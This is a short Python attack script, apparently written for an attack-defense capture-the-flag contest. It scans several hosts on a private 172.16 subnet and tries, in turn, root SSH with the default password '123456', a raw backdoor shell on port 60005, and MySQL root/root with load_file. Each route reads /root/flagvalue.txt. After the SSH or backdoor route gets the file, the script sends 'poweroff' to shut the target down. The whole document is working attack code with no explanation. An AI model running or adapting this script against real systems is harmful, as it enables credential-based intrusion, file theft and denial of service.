import paramiko,MySQLdb,threading,time,requests,socket

def exploit(host):
    host = '172.16.'+str(host)+'.250'
    try:
        PORT = 22
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host,PORT,'root','123456',timeout=5)
        std1,std2,std3 = ssh.exec_command('cat /root/flagvalue.txt')
        flag = str(std2.read())
        if len(flag) != 0:
            eflag(host,flag)
            std1,std2,std3 = ssh.exec_command('poweroff')
            return

    except:
        pass
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host,60005))
        s.send(b'cat /root/flagvalue.txt\n')
        flag = str(s.recv(1024))
        if len(flag) != 0:
            eflag(host,flag)
            s.send(b'poweroff\n')
            return
        
    except:
        pass
    try:
        mysql = MySQLdb.connect(host,'root','root')
        cursor = mysql.cursor()
        cursor.execute('SELECT load_file("/root/flagvalue.txt");')
        flag = str(cursor.fetchone())
        if len(flag) != 0:
            eflag(host,flag)
            return
    except:
        pass

    print("未获取到flag的主机为%s" %host)

def eflag(host,flag):
    with open('result.txt','a+') as f:
        value = host + '/' +flag + '\n'
        f.write(value)
        f.close()

def main(): 
    for host in range(101,105):
        t2 = threading.Thread(target=exploit,args=(str(host),))
        t2.start()

if __name__=='__main__':
    main()